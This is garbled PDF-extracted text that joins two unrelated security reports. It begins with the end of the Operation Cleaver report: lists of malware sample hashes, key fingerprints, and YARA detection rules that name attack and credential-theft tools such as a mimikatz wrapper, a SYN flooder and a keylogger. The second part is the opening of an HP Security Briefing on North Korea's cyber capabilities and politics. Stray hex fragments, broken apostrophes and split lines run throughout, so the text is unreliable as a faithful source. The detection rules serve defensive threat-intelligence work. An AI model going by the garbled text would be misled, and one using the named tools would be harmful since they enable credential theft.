67a2b9c32653161fafaea231b6661d9d797bb0964c79c9ee46cf2bf76571ed45
6888723e56f2e7696ac1e1910f68a1d54d7c76e9eb8e69554980b04e881e0e86
7199acca3d851889efa4a5a42b3f55010f4916294201ce5ad20c76898200ffa9
75b77606175ee696395f1b0e6850d5cd6596e34f74804b30c9bf9e368ebcd299
7890a726603edcd70b6e6f3de367cf891131d833d14c506b26e07935a715048f
79ca080a152bd44f9b07af0f940c303e45e10d516633384f5b3d34a29d0d03c8
7b9fd4b9b36cf84fcbcb3e9bf589d8a51c2166558baf462ab312929fbb584642
80ed4e7a242ee3d1c2656affb04cd56e7262e5a6bf2bec2f8435aa3f47c9b5d1
8129345ce66643d880a3e01e607399279dec7bf9cadc06d9b26134f6d205ed06
8813bd0b4ad6c6155b571c9c1fbcabfeed3812ab8fbd9acd8372385094aaa565
8f02dfd900760cb2c84e4f5a859512f5d719daae063a719c956cbf6185004da5
8f9a45ba73c67ba9c4958ea49508c350a0e1c3caf476ccab2fb8cb3049e3ba46
902f2391b1075e14985bc91316c98cdcf3442ecaeb3ef12422813f946ab8409e
9801f7c552cbcf8c413dade920b96be2eaad9624ba4adaf17f80f815dac58974
9aec3f14ec69e9942a7d3075bb5479dc5fa61e6c2a03cbee1a9269264efac51c
9ba06cb9dcd05e6866ee0e9ecc0c9a480d5b6c8d177ef1907d7fcc02e2871806
9ebbd300ddf70bccbecfe3bf47898e5959cfc090cef8716e2e638d840a24007b
a321158d7f5be572ac5536ad57cb4a312bea52430b03da9dda97f4548a080bc3
aa23c55bed562cbf47c84092d0a35b0da35e3db3982a18a28fb45ca70ac6b399
aa7ac2a053ceba819fcd1c8b273db64296c2754a8101291870e142519c416b1b
abb0ebd57cf2b0d54cd2b01fd9b11ccd9ed68053174d131922811a9ad22459ea
ac272bd9701c5d9cb7e8d1a4e2a191a894e98aa463fb17628c52da16612627d8
ad06e03fdd9eff480ca623ea23ec87c794d99ae6dda308c979fa5173b2b8a514
ad5fbf8e381d92225aa6c022e2bbc175be0e33138b5fa4bbb508b970b33bbc1e
ad71283aadb2455f7a1cd4e8283c789599c33d328da44965f6c282f2e600e1b2
aebac79b820891510b9e14ef97892875bf4197797ca91aef149acdc1e6bf6a7c
af8deedc78097c387926bb95ebd6ab2a870349794f452f35f84132b0dbe12e09
b18f80a02d45eaed618993447c82916ad8802e552dddccf733a3698794d8cb9d
b275caf4cbc4f47b3d772886172438b81a2e11ff5a8683be488de4b219b39070
b42ef5f39aaf6e52ff4e0510b6e5c3fb5c84bf35befcde8bcc18dc86bccbdfb4
b49706b7d5432a368070ee58aa8776cce1ddc2098e863b1b7b36d7b7d79fe6a9
b4d4c421bc70e5a3345d4b8c9d1090ff16ff82870bd38216bb8bac7f1088dafb
b99cddd428e78ede109c7bd3683c374ac6010a15c0633939511e39c1ed99f621
bb2b135c7a9b366ec7090404761a9ee9e7c03c56d68165a6789a29e804104068
be4cc2d1504002107a77bb943ad2d22c205cdcc6ad4804c0440970e5e922d30d
bf7746d29330b666d82b153989d41406305572b92f6b24a1f1adef6374b58328
bfa66edd0d9ae2c8179893ee881f479b37dce0ce8220a8a18e1b42a879ddff4a
c11a244cba9da30173ff1dcb755a377c3b2b1f99cd15a887041937b086113ebd
c1c1e5b43b1ac9af79aafa59a6062468142afc2278b6fea0bb4dbbb83af65d06
#OPCLEAVER
  Samples (SHA-256) cont.
  c30a2fe22050dcac30616a3d27d5c92ea2815d060b365747984913758a209aaa
  c74df42cfc7c7221f7f28c67bd726a1caad8453fc35daddfb094aaeede2e8e1e
  c9010e060de6a83c3802ed4e6b7f544e6eb2b5420ee2be5c71646e6a27182bea
  c901d84878f50a93ab76f2ea31763bebb0acf0c0f9ad86b3abf98e5cde499332
  c99fa90038cec60d9aa21a49e537ad9ea55672ed78cf5b429cb4c75ebc5ccd69
  c9fc8133e755c14cb02872ba05a2332baefe5e94797479aded46c3db83a7cc14
  ca7138bfe08b480386653072482e58f6c48b05a1e7fb8a82cc042806eae9acc2
  caa769a21bf97987de4cc92874eaa03e7b0538082c502606aa8ca97823e2e2aa
  cd75664edea18e3aa303763e6f6c639b3e90ead4b51c2b3e41c808e3d968c848
  cffba2a145d91bdecfa8cb32af6964576889faa04591b503a58507cf89ab7cae
  d045ea925cf461da5c58cc2af8a0f96ec7c961ea62ffcf1de0b04abf9b0fa8ac
                                   20476 f64
  d11b504b18bc8615e98f3c37d98c6fe11216a0f070a056414ca4407fc298fbd6
                                 6f
  d3c2488d321ca6760986fc1a55a3c1db3f7b215fc2883d7e4fabc2871b5a27ac
                                4
                               4
  d4e54c1bc1efba20d75861c01bb2cc053b1ab9fadae29bf6c4c04528110056e6
                             20
  d5d1fa5b5474089e59c05ca88a96257d4449d852b429c620aa773408bd48d067
  d8c7aef47bac024188d929e749e90ac172fd51b8f6e16dec4b6635dc2ffa85ef
                              c
                            c2
  dc21a2189f9e2d63872c0b5ee7ec75316799c60eb018ba9b98398b69efe45365
  dc22e4b5ef752d3ec47d7bb3de7534e4a2daa2642de8c9839ad262d33a7aa7dc
                    04576696
  e180f933aad709883acde441ee64407d49fa4183ae5130480005a0e81a0de491
  e250bce96e5f0c162dbe4d87a1a7d65deb910f59c0bea1140897c22eb9dca501
  e2e9d60c76225db77668440ff698eacef48b544ffab1ae0c641dcedb5ad570bd
  e339c7b77113f1a1c4c2f7e307b785cc4fc9145663fe3a612079240efcc9ac93
  e3b38627d9e94a7e084e12cbd2acf7e66ce90021972061f8b9b61316eddb3bd6
  e401340020688cdd0f5051b7553815eee6bc04a5a962900883f1b3676bf1de53
  e4d43cd20d4ea59f68c26d46c30e1819cac5b9552d27fce826b0855494018267
                  b2
  e509843b2c061fa5e6ea7d11554bb22f36e6b79b7cd5cc0639ff63d48ce66336
                 6
  ed85c3f8d2cccbb6a0ec2b4b27b158b4dbc6885245081901dd51eb2266f4b2bf
                e
  ee33dd17802ca906fcc68815ff2a7d12ac7fab7f1c272a56444e4fd6715a6227
               6
  eea0dcabaabef075081e23fc91b84e07042117bb0362e59f11b17338108d0c1b
              9
                                 6
  f7e1a74e08c5718de9edc57facc26dda97ae5b723420a06ef56f1f6f8aa6fb5a
                                8
  fbc531e83359310e2940ffff180a26e28d55396710c748e2ae7e64357273a09d
                             546
  fd4a9af7ba67f794a83a720539666e89f288686a432b5c7133033a2ebde266cc
  Public/Private Key Fingerprints
  0A:E1:AE:85:6A:BB:D5:87:BF:8E:21:4E:92:E6:1F:8C
  70:70:2F:11:2B:01:03:4A:70:D9:5E:11:CC:E9:7A:16
  6F:DB:BB:BA:DA:7F:FA:4B:3F:A1:C3:46:5E:4B:8F:31:E8:31:F1:EC
  78:BE:02:06:B3:1E:57:DF:62:4E:30:16:ED:AA:5C:56:F7:E8:11:62
                                                                     81
                                                                           476f6f64
                                                                       6f20
                                                                     44
OPERATION
                                                                   20
                                                                   2c
                                                        b204576696c
CLEAVER
                                                      e6
                                                    96
                                                                      86
                                                                   546
YARA Signatures
rule BackDoorLogger
  strings:
    $s1 = 
BackDoorLogger
    $s2 = 
zhuAddress
  condition:
    all of them
rule Jasus
  strings:
    $s1 = 
pcap_dump_open
    $s2 = 
Resolving IPs to poison...
    $s3 = 
WARNNING: Gateway IP can not be found
  condition:
    all of them
rule LoggerModule
  strings:
    $s1 = 
%s-%02d%02d%02d%02d%02d.r
    $s2 = 
C:\\Users\\%s\\AppData\\Cookies\\
  condition:
    all of them
rule NetC
  strings:
    $s1 = 
NetC.exe
 wide
    $s2 = 
Net Service
  condition:
    all of them
rule ShellCreator2
  strings:
    $s1 = 
ShellCreator2.Properties
    $s2 = 
set_IV
  condition:
    all of them
#OPCLEAVER
  YARA Signatures (cont.)
  rule SmartCopy2
    strings:
      $s1 = 
SmartCopy2.Properties
      $s2 = 
ZhuFrameWork
    condition:
      all of them
  rule SynFlooder
    strings:
      $s1 = 
Unable to resolve [ %s ]. ErrorCode %d
                                6f20476 f64
      $s2 = 
your target
s IP is : %s
      $s3 = 
Raw TCP Socket Created successfully.
    condition:
                              44
                            20
      all of them
                             c
                           c2
  rule TinyZBot
                   04576696
    strings:
      $s1 = 
NetScp
 wide
      $s2 = 
TinyZBot.Properties.Resources.resources
      $s3 = 
Aoao WaterMark
      $s4 = 
Run_a_exe
      $s5 = 
netscp.exe
                  2
      $s6 = 
get_MainModule_WebReference_DefaultWS
                 b
      $s7 = 
remove_CheckFileMD5Completed
                6
      $s8 = 
http://tempuri.org/
              6e
       $s9 = 
Zhoupin_Cleaver
             9
    condition:                  6
                               8
       ($s1 and $s2) or ($s3 and $s4 and $s5) or ($s6 and $s7 and $s8) or
  $s9)                      546
  rule ZhoupinExploitCrew
    strings:
      $s1 = 
zhoupin exploit crew
 nocase
      $s2 = 
zhopin exploit crew
 nocase
    condition:
      1 of them
                                                                            83
                                                                                 476f6f64
                                                                             6f20
                                                                           44
OPERATION
                                                                         20
                                                                         2c
                                                              b204576696c
CLEAVER
                                                            e6
                                                          96
                                                                            86
                                                                         546
YARA Signatures (cont.)
rule antivirusdetector
strings:
          $s1 = 
getShadyProcess
          $s2 = 
getSystemAntiviruses
          $s3 = 
AntiVirusDetector
condition:
          all of them
rule csext
  strings:
    $s1 = 
COM+ System Extentions
    $s2 = 
csext.exe
    $s3 = 
COM_Extentions_bin
  condition:
    all of them
rule kagent
  strings:
    $s1 = 
kill command is in last machine, going back
    $s2 = 
message data length in B64: %d Bytes
  condition:
    all of them
rule mimikatzWrapper
  strings:
    $s1 = 
mimikatzWrapper
    $s2 = 
get_mimikatz
  condition:
    all of them
rule pvz_in
  strings:
    $s1 = 
LAST_TIME=00/00/0000:00:00PM$
    $s2 = 
if %%ERRORLEVEL%% == 1 GOTO line
  condition:
    all of them
#OPCLEAVER
  YARA Signatures (cont.)
  rule pvz_out
    strings:
      $s1 = 
Network Connectivity Module
 wide
      $s2 = 
OSPPSVC
 wide
    condition:
      all of them
  rule wndTest
    strings:
      $s1 = 
[Alt]
 wide
      $s2 = 
<< %s >>:
 wide
                                6f20476 f64
      $s3 = 
Content-Disposition: inline; comp=%s; account=%s; product=%d;
    condition:                44
      all of them
                            20
                             c
                           c2
  rule zhCat
                   04576696
    strings:
      $s1 = 
zhCat -l -h -tp 1234
      $s2 = 
ABC ( A Big Company )
 wide
    condition:
      all of them
  rule zhLookUp
                  2
                 b
    strings:
                6
      $s1 = 
zhLookUp.Properties
               e
    condition:
             96
      all of them
  }                            86
  rule zhmimikatz           546
    strings:
      $s1 = 
MimikatzRunner
      $s2 = 
zhmimikatz
    condition:
      all of them
                                                                              85
                                                                 476f6f64
                                                             6f20
                                                           44
OPERATION
                                                         20
                                                         2c
                                              b204576696c
CLEAVER
                                            e6
                                          96
                                                            86
                                                         546
                           6f20476f6f64
                        044
                       2
                       2c
           6b204576696c
         6e
        9
                          86
                       546
                            #OPCLEAVER
Companion report
HP Security Briefing
Episode 16, August 2014
Profiling an enigma: The
mystery of North Korea
s cyber
threat landscape
HP Security Research
                 Table of Contents
                 Introduction .................................................................................................................................................... 3
                 Research roadblocks ...................................................................................................................................... 4
                 Ideological and political context .................................................................................................................... 5
                     Juche and Songun...................................................................................................................................... 5
                     Tension and change on the Korean Peninsula .......................................................................................... 8
                 North Korean cyber capabilities and limitations ......................................................................................... 10
                     North Korean infrastructure.................................................................................................................... 10
                     An analysis of developments in North Korean cyberspace since 2010 .................................................. 14
                     North Korean cyber war and intelligence structure ................................................................................ 21
                     North Korean cyber and intelligence organizational chart ..................................................................... 26
                     North Korea
s cyber doctrine, strategies and goals ............................................................................... 26
                     Cyber warfare operations ........................................................................................................................ 27
                     Gaming for profit and pwnage ................................................................................................................ 29
                     Intelligence and counterintelligence ...................................................................................................... 29
                     Psychological operations ........................................................................................................................ 32
                     Electronic warfare ................................................................................................................................... 38
                     Training cyber warriors ........................................................................................................................... 39
                 Important political and military ties ............................................................................................................ 42
                     China ........................................................................................................................................................ 42
 Copyright 2014 Hewlett-Packard Development Company, L.P. The information contained herein is subject to change without notice. The only warranties for HP
products and services are set forth in the express warranty statements accompanying such products and services. Nothing herein should be construed as constituting an
additional warranty. HP shall not be liable for technical or editorial errors or omissions contained herein.
    Russia ...................................................................................................................................................... 43
    Iran ........................................................................................................................................................... 43
    Syria ......................................................................................................................................................... 44
    Cuba ......................................................................................................................................................... 44
Timeline of significant North Korean cyber activity .................................................................................... 45
Patterns in the noise: cyber incidents attributed to North Korean actors .................................................. 47
    DarkSeoul ................................................................................................................................................ 50
    WhoIs Team ............................................................................................................................................. 52
    IsOne ........................................................................................................................................................ 55
    Kimsukyang ............................................................................................................................................. 57
    New Romantic Cyber Army Team / Hastati ............................................................................................. 57
Malware summary........................................................................................................................................ 58
Analysis ........................................................................................................................................................ 60
Summary ...................................................................................................................................................... 61
HP Security Research recommendations..................................................................................................... 62
Appendix A 
 WHOIS records ........................................................................................................................ 64
Appendix B 
 Sites found on North Korean IP space.................................................................................... 72
Appendix C 
 Analysis of DarkSeoul Dropper .............................................................................................. 74
    Learn more at .......................................................................................................................................... 75
Episode 16
Thank you for subscribing to Episode 16 of the HP Security Briefing. In this
edition we discuss the cyber landscape within the Democratic People
Republic of Korea.
Introduction
The Democratic People
s Republic of Korea (DPRK), known in the West as North Korea, is a unique
country with a military-focused society and an unconventional technology infrastructure. While
North Korea was formerly on the U.S. list of state sponsors of terrorism, it was removed in 2008. 1
However, due to North Korea
s hostility toward other nations, its pursuit of nuclear weapons, and
human rights violations against its own citizens, the United Nations and many Western entities
have placed sanctions and embargoes against North Korea.2 3 For example, U.S. export laws
forbid the sale of dual-use technologies, or those that can be used or repurposed for both civilian
and military use, to North Korea.4 5 Additionally, the U.S. has a military alliance with the Republic of
Korea (ROK), known in the West as South Korea, North Korea
s primary target of conflict.6
Due to North Korea
s global interactions, its cyber warfare capabilities are of particular interest to
the U.S. According to a 2009 report by Major Steve Sin, an intelligence analyst at U.S. Forces
Korea, North Korean hackers have successfully penetrated U.S. defense networks more
frequently than any other country that has targeted U.S. defense assets.7 While Major Sin may
have been overly optimistic about North Korea
s abilities, it is clear that they should not be
underestimated. Frank Cilluffo, co-director of the Cyber Center for National and Economic Security
at George Washington University, testified before Congress that North Korea
s cyber capability
"poses an important 'wild card' threat, not only to the United States but also to the region and
broader international stability
"8 In an April 2014 testimony given to the House Armed Services
Committee, General Curtis M. Scaparrotti noted that 
North Korea remains a significant threat to
United States
 interests, the security of South Korea, and the international community due to its
willingness to use force, its continued development and proliferation of nuclear weapon and long-
range ballistic missile programs, and its abuse of its citizens
 human rights, as well as the
legitimate interests of its neighbors and the international community.
 Scaparrotti stressed that
While North Korea
s massive conventional forces have been declining due to aging and lack of
resources
North Korea is emphasizing the development of its asymmetric capabilities. North
  http://thecable.foreignpolicy.com/posts/2010/05/25/why_the_state_department_wont_put_north_korea_back_on_the_terror_list
  http://www.sanctionswiki.org/North_Korea
  https://www.fas.org/irp/offdocs/eo/eo-13551.pdf
  http://www.foxnews.com/world/2012/04/17/un-computer-shipment-to-north-korean-regime-violates-us-manufacturers-ban/
  http://www.state.gov/strategictrade/overview/
  http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
  http://www.nextgov.com/defense/whats-brewin/2009/07/north-koreas-hackers-in-a-luxury-hotel/51330/
  http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/3
Korea
s asymmetric arsenal includes
an active cyber warfare capability.
9 While one would expect
the regime
s digital infrastructure to also suffer from aging or lack of resources, these factors do
not take away from their technical abilities to wage cyber warfare.
While the U.S. views North Korea
s cyber warfare program as the regime
s foray into modern
asymmetrical warfare, South Korea views the regime
s cyber capabilities as a terroristic threat, -a
build-up for an impending multifaceted attack. It is important to note that, to date, no such attack
has occurred. According to a report written by Captain Duk-Ki Kim, Republic of Korea Navy officer
and Ph.D. 
the North Korean regime will first conduct a simultaneous and multifarious cyber
offensive on the Republic of Korea
s society and basic infrastructure, government agencies, and
major military command centers while at the same time suppressing the ROK government and its
domestic allies and supporters with nuclear weapons.
10 South Korea
s view of North Korea as a
terroristic threat may be an attempt to downgrade North Korea politically, since South Korea does
not recognize the regime as a legitimate state.11 South Korean reports also claim that North
Korea
s premier hacking unit, Unit 121, trails Russia and the U.S. as the world
s third largest cyber
unit. 12 While this claim may be exaggerated, in 2012, South Korean reports estimated North
Korea
s hacker forces at around 3000 personnel. In a July 2014 report from South Korea
s Yonhap
News Agency, that figure was upgraded to 5900 hacker elite.13 We must stress that although
these claims have not been corroborated, South Korea has taken the regime
s cyber threats very
seriously and is reportedly training 5000 personnel to defend against North Korean cyber
attacks.14
Obtaining details on North Korea
s cyber warfare capabilities is not an easy task. This paper will
examine the known cyber capabilities of North Korea
s regime and how the country maintains
secrecy in these matters. Through information obtained via open source intelligence (OSINT), we
will present what is known about North Korea
s cyber warfare and supporting intelligence and
psychological operations capabilities.
Research roadblocks
The following conditions proved to be research roadblocks when gathering intelligence regarding
North Korea
s cyber warfare capabilities:
    
 Much of the intelligence available on North Korea is dated and may not accurately reflect
        the regime
s current capabilities.
    
 Much of the intelligence available on North Korea comes from U.S. or South Korean
        military or agency reports. These reports omit details that are likely classified, such as
        specific IP addresses and individual actor information.
    
 While South Korea is an ally of the United States, its reports on North Korean cyber
        activity potentially contain incomplete or biased information. Cultural factors that stem
  http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
   https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
   http://www.atimes.com/atimes/Korea/GA04Dg01.html
   http://www.koreaherald.com/view.php?ud=20130321000980
   http://www.theregister.co.uk/2014/07/07/north_korea_employs_6000_leet_hackers_source_claims/
   http://www.theregister.co.uk/2014/07/07/north_korea_employs_6000_leet_hackers_source_claims/
           from a history of tension and conflict between the two nations may skew perception and
           make objectivity difficult. 15 16
     
     North Korea
s Internet infrastructure and the regime
s strict control over its use ensures
           that there are no rogue actors and that all officially sanctioned actors exercise careful
           OPSEC and PERSEC practices in order to prevent inadvertent information leaks. In other
           words, there was no significant identifying information in the form of an OSINT trail left
           behind by the actors. This hinders collection of original, actionable threat intelligence and
           individual actor attribution.
     
     North Korea is well-isolated from the outside world, and its strong intelligence and
           psychological operations presence effectively creates confusion via counterintelligence
           and disinformation about the regime
s capabilities.17 For this reason, any 
official
 reports
           emanating from North Korea must be taken with a grain of salt. This also hinders
           attempts to obtain original, actionable threat intelligence.
Ideological and political context
In order for Westerners to understand the North Korean mindset, it is necessary to examine the
key components of North Korean political and ideological thought. It is also necessary to provide a
brief explanation of how North Korea and South Korea view one another, in order to understand
the basis for conflict between the two.
Juche and Songun
North Korea has two primary ideologies that provide context for the regime
s motivations and
activities: juche (ju-cheh) and songun (sun-goon). Juche is the official political ideology of North
Korea. It was instituted in 1972 and is based on the ideologies of Kim Il-Sung, the founder of the
DPRK. Juche emphasizes self-reliance, mastering revolution and reconstruction in one
s own
country, being independent of others, displaying one
s strengths, defending oneself, and taking
responsibility for solving one
s own problems. North Korea
s air-gapped intranet, described below,
exemplifies this philosophy in the country
s cyber infrastructure. The juche philosophy explains
North Korea
s disdain for outside cultural and political influence. Juche challenges North Koreans
to contribute to the regime
s chaju (ja-ju), a concept of national sovereignty and independence.18
The regime
s greatest fear is internal dissent and resulting destabilization.19 20 In a June 2014
Reddit AMA session, Dr. Andrei Lankov, an expert on North Korean culture and society, noted
there are also serious signs of public alienation and discontent. And I cannot rule out a public
outbreak of such discontent in the near future. Of course, if it happens, it will have a serious
impact on the government.
21 Despite North Korea
s strong conviction in juche, the regime
collaborates with and receives support from other nations. However, due to this deep-seated
   http://www.businessinsider.com/did-kim-jong-un-execute-his-ex-girlfriend-2013-8
   http://www.telegraph.co.uk/news/worldnews/asia/northkorea/10554198/North-Koreas-invisible-phone-killer-dogs-and-other-such-stories-
why-the-world-is-transfixed.html
   http://edition.cnn.com/2014/04/01/world/north-korea-provocation/index.html?iid=article_sidebar
   http://www.stanford.edu/group/sjeaa/journal3/korea1.pdf
   http://belfercenter.ksg.harvard.edu/publication/20269/keeping_kim.html
   http://www.buzzfeed.com/miriamberger/the-world-as-viewed-by-north-koreas-propaganda-machine
   http://www.reddit.com/r/NorthKoreaNews/comments/296ryd/i_am_dr_andrei_lankov_i_studied_in_north_korea/
ideology, it is doubtful that North Korea fully trusts these apparent allies.22 Later in this document,
we will show that North Korea relies heavily on China for Internet access. North Korea also
collaborates with China and Russia to train its cyber warriors and has longstanding political and
military relationships with several nations.
Songun is North Korea
military first
 doctrine. Songun emphasizes the priority of the military in
resource allocation and political and economic affairs. 23 This doctrine stems from the belief that
the military is vital for preservation of chaju.24 Understanding songun mindset gives context for
this potential threat actor
s motivations. According to a 2013 Congressional report, the strategy
established under former leader Kim Jong-Il focused on 
internal security, coercive diplomacy to
compel acceptance of its diplomatic, economic and security interests, development of strategic
military capabilities to deter external attack, and challenging South Korea and the
U.S.-South Korean alliance."25                                                            Songun is North Korea
                                                                                                                               
military first
 doctrine.
North Korea
s songun permeates the lives of all North Korean citizens. Article 58 of                                           Songun emphasizes the
                                                                                                                               priority of the military in
the North Korean Constitution states that the nation should base itself on a                                                   resource allocation and
nationwide defense system that includes all people.26 North Korea, with a                                                      political and economic
population of 25 million, has an active duty force of 1.19 million personnel, the                                              affairs. Understanding this
fourth largest in the world. The country
s reserve and paramilitary units comprise                                             mindset gives context for a
                                                                                                                               potential threat actor
7.7 million additional personnel.27 In other words, over a third of the country
                                                                                                                               motivations.
population serves in a military or paramilitary capacity.
Some North Korean youth aged 7-13 are inducted into the Korean Children
s Union. The Korean
Children
s Union is responsible for indoctrinating youths who pledge to build up their strength to
later defend the regime.28
   http://www.defense.gov/pubs/ReporttoCongressonMilitaryandSecurityDevelopmentsInvolvingtheDPRK.pdf
   http://www.strategicstudiesinstitute.army.mil/pdffiles/pub728.pdf
   http://www.iar-gwu.org/sites/default/files/articlepdfs/DeRochie_-_The_Driving_Factor.pdf
   http://www.defense.gov/news/newsarticle.aspx?id=119924
   http://asiamatters.blogspot.co.uk/2009/10/north-korean-constitution-april-2009.html
   http://edition.cnn.com/video/data/2.0/video/international/2014/04/29/north-korea-military-numbers.cnn.html
   http://www.dailymail.co.uk/news/article-2307937/North-Korea-Haunting-images-indoctrination-ceremony-communist-cult-leaders-threatening-
nuclear-war-poisoning-generation.html?ITO=1490&ns_mchannel=rss&ns_campaign=1490
Figure 1 A group of North Korean children being inducted into the Korean Children
s Union.29
Figure 2 Members of the Korean Children
s Union with the regime
s leader Kim Jong Un.30
  http://www.dailymail.co.uk/news/article-2307937/North-Korea-Haunting-images-indoctrination-ceremony-communist-cult-leaders-threatening-
nuclear-war-poisoning-generation.html?ITO=1490&ns_mchannel=rss&ns_campaign=1490
Children aged 14-16 can begin military training as members of the Young Red Guards, a
paramilitary unit. Beginning at age 17, North Koreans are eligible to join the Reserve Military
Training Unit.31 The Reserve Military Training Unit forms the core of North Korea
s reserves and is
typically assigned to the front or regional defense in wartime.32 The youngest age at which a
citizen can be conscripted for active duty is unclear; reported ages range from 18-20. Youths can
volunteer for active duty service at age 16 or 17.33 The Worker-Peasant Militia, or Red Guards,
includes males ages 17-60 and unmarried females ages 17-30 who are not part of active duty
units or the Reserve Military Training Unit.34
The regime has an impressive number of conventional weapons, considering the nation
s small
land area and population size.35 According to statistics released by CNN in 2014, North Korea
ground arsenal includes 4100 tanks, 2100 armored vehicles, and 8500 pieces of field artillery.
The regime
s sea weaponry includes 70 submarines, 420 patrol combatants, and 260 amphibious
landing craft. Their airpower includes 730 combat aircraft, 300 helicopters, and 290 transport
aircraft. While the limits of the regime
s ballistic missile program are unknown, North Korea is
thought to have fewer than 100 short-range missiles and fewer than 100 medium to long-range
missiles.36 However, in recent years, North Korea has suffered oil,37 fuel,38 electricity,39 and food40
shortages. Without aid from another entity, the regime does not have sufficient resources to
maintain and sustain the majority of its weapons and associated personnel for rapid deployment
or prolonged combat.
Tension and change on the Korean Peninsula
Tension between North and South Korea has continued well past the armistice meant to end the
Korean War. Neither nation recognizes the other as a legitimate state. South Korea
s constitution
legally defines South Korean territory as the entire Korean peninsula and its adjacent islands, with
North Korea
 being a part of South Korea. 41 North Korea also claims to be the sole government
of the Korean Peninsula.42 Each country
s claim of sovereignty and refusal to acknowledge the
other as a legitimate state creates the condition for perpetual conflict. North Korea
s negative
sentiment towards the U.S. stems from two major factors: the U.S. 
 South Korea military alliance
and North Korea
s perception that the U.S. is imperialistic and prone to exploitative capitalism. 43
   http://www.dailymail.co.uk/news/article-2307937/North-Korea-Haunting-images-indoctrination-ceremony-communist-cult-leaders-threatening-
nuclear-war-poisoning-generation.html?ITO=1490&ns_mchannel=rss&ns_campaign=1490
   http://www.globalsecurity.org/military/world/dprk/army.htm
   http://www.globalsecurity.org/military/world/dprk/army.htm
   https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=6&ved=0CFkQFjAF&url=http%3A%2F%2Fwww.child-
soldiers.org%2Fuser_uploads%2Fpdf%2Fkoreademocraticpeoplesrepublicof2639438.pdf&ei=fcyIU_uqCMas0QXUk4DoCw&usg=AFQjCNGOnkQt5ZStqxfc
tKrUY-5IWYSH0A&sig2=ivQLF6lHkSO8Yx9O9VlO4g&bvm=bv.67720277,d.d2k&cad=rja
   http://www.globalsecurity.org/military/world/dprk/army.htm
   http://www.globalfirepower.com/
   http://edition.cnn.com/video/data/2.0/video/international/2014/04/29/north-korea-military-numbers.cnn.html
   http://www.presstv.com/detail/2013/04/23/299897/facing-food-and-oil-shortages-north-korea-turns-to-iran/
   http://english.chosun.com/site/data/html_dir/2014/07/02/2014070201995.html
   http://www.rfa.org/english/news/korea/electricity-10212013160033.html
   http://edition.cnn.com/2013/04/09/business/north-korea-economy-explainer/
   http://www.atimes.com/atimes/Korea/GA04Dg01.html
   http://teacher.scholastic.com/scholasticnews/indepth/north_korea/north-south/index.asp?article=north_korea
   http://cns.miis.edu/other/pinkston_strategic_insights_sep06.pdf
In recent years, two primary factors have heavily influenced the current state of North Korea
relations with South Korea and her allies: the rise of the regime
s leader Kim Jong Un and the
inauguration of South Korean president Park Guen Hye. Kim Jong Un officially rose to power in
April 2012, following the death of his father Kim Jong Il in December 2011. While his age
remained a mystery for quite some time, it was later revealed that he was born in January 1983,
making him age 31 at present. This makes Kim Jong Un the world
s youngest leader of an
established nation.44 The young leader
s rise to power brought about several changes in North
Korea. First, Kim Jong Un
s personal life is more public and more extravagant than that of his
father. Unlike his father, the young Kim is often accompanied by his wife when making public
appearances.45 Second, the young Kim, who is more high-tech than his predecessor, is reported to
have an affinity for luxury items46 and is an avid gamer and basketball fan.47 Third, Kim Jong Un is
more totalitarian than his father. Following his rise to power, the regime reportedly expanded its
labor camps, and more military resources were allocated to target those attempting to defect.
Kim also executed his own uncle, a high-ranking official who did not share his ideals. These moves
indicate the regime
s priority to deter internal destabilization and dissent, which is perceived to be
a greater threat than outside adversity. According to Phil Robertson, deputy Asia director at
Human Rights Watch, 
The government now recognizes that the accounts of escaping North
Koreans reveal Pyongyang
s crimes 
 so it is doing what it can to stop people from fleeing.
Under Kim Jong Un
s rule, the regime has stepped up its nuclear materials production, and the
propaganda distributed by state media has become more menacing.49
The regime
s response to perceived threats has also become more volatile. Christian Whiton, a
former deputy envoy to North Korea, noted that following Kim Jong Un
s rise to power, 
regime still acts in a very belligerent manner, but it seems less predictable, and more random.
Ellen Kim, assistant director of the Korea Chair at the Center for Strategic and International
Studies, assessed the situation thusly: 
Since [Kim Jong Un] took power he has purged almost all
of his elder guardians ... and filled his surroundings with new faces. We are in a situation where we
are learning about him a little bit every day through his unpredictable behavior and actions, which
is why the current situation with North Korea is a lot more dangerous than before.
50 The regime
recent reaction to an upcoming film supports these statements. The plot for the comedy film 
Interview
 follows two talk show hosts who are asked to assassinate Kim Jong Un. The regime
even sent a complaint about the movie to the UN.51 In response to the film, a North Korean official
stated, 
The enemies have gone beyond the tolerance limit in their despicable moves to dare hurt
the dignity of the supreme leadership.
 The official referred to the movie as "the most undisguised
terrorism and a war action to deprive the service personnel and people of the DPRK of their
mental mainstay and bring down its social system.
 The official also issued a threat: 
If the U.S.
administration connives at and patronizes the screening of the film, it will invite a strong and
merciless countermeasure.
52 This reaction demonstrates North Korea
s priority of preserving the
   http://www.theatlantic.com/international/archive/2012/12/kim-jong-uns-age-is-no-longer-a-mystery/265983/
   http://www.telegraph.co.uk/news/worldnews/asia/northkorea/10522136/Kim-Jong-un-10-ways-North-Koreas-Dear-Leader-is-different.html
   http://www.huffingtonpost.com/2014/02/18/north-korea-luxury-goods_n_4808823.html
   http://nypost.com/2011/12/20/kims-007-nut-kid-in-charge/
   http://www.hrw.org/news/2014/01/21/north-korea-kim-jong-un-deepens-abusive-rule
   http://www.telegraph.co.uk/news/worldnews/asia/northkorea/10522136/Kim-Jong-un-10-ways-North-Koreas-Dear-Leader-is-different.html
   http://edition.cnn.com/2014/04/01/world/north-korea-provocation/index.html?iid=article_sidebar
   http://www.northkoreatech.org/2014/07/10/dprk-takes-the-interview-movie-complaint-to-the-un/
   http://edition.cnn.com/2014/06/25/world/asia/north-korea-the-interview-reaction/index.html?iid=article_sidebar
regime
s self-perceived dignity in the global arena and its intolerance of any disrespect directed at
the Kim family.
While tensions between North and South Korea have persisted since the Korean War, these
tensions escalated following the 2013 inauguration of South Korea
s current president, Park Geun
Hye. Her platform, in her words, is as follows: 
North Korea must keep its agreements made with
South Korea and the international community to establish a minimum level of trust, and second
there must be assured consequences for actions that breach the peace. To ensure stability,
